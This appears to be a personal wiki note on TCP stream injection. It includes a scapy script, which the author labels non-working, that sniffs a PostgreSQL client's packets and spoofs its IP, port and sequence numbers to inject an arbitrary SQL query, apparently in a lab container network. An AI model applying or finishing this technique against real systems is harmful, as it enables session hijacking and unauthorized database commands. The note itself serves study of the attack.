If you can record passing packets, for example on wireless WiFi or in a partial-capability container, and can send arbitrary packets, in theory you can send packets on the name of another sender in the middle of TCP stream, and just sniff the response.
An example simpler usage is [[Force Disconnection]].
However, this can make you send arbitrary packets in the middle of another communication.
You can record the tcp stream numbers and ack numbers, and forge a valid packet.
In practice, this can go wrong in many ways, especially if the client sends packets quickly and your injection is on the middle of its stream, or your attempted stream number was already used by the real client.
Making an error to force disconnect is much easier.
## Implementation
Probably best to do with scapy, that can forge arbitrary packets, and sniff.
An example NOT WORKING implementation:
```python
from scapy.all import *
from scapy.layers.inet import *
from scapy.layers.http import *
from scapy.contrib.postgres import *

def is_query(packet):
	return Query in packet

query = input("Enter query:")
query_packet = sniff(lfilter=is_query, count=1)[0]
print("Received query packet")
packet = IP() / TCP() / Query()
packet[TCP].sport = query_packet[TCP].sport
packet[TCP].dport = 5432
packet[TCP].flags = "PA"
packet[TCP].ack = query_packet[TCP].ack
packet[TCP].seq = query_packet[TCP].seq + len(query_packet[TCP].payload)
packet[IP].src = "172.19.0.3"
packet[IP].dst = "172.19.0.2"
packet[Query].query = query
resp = sr1(packet)
resp.show()
```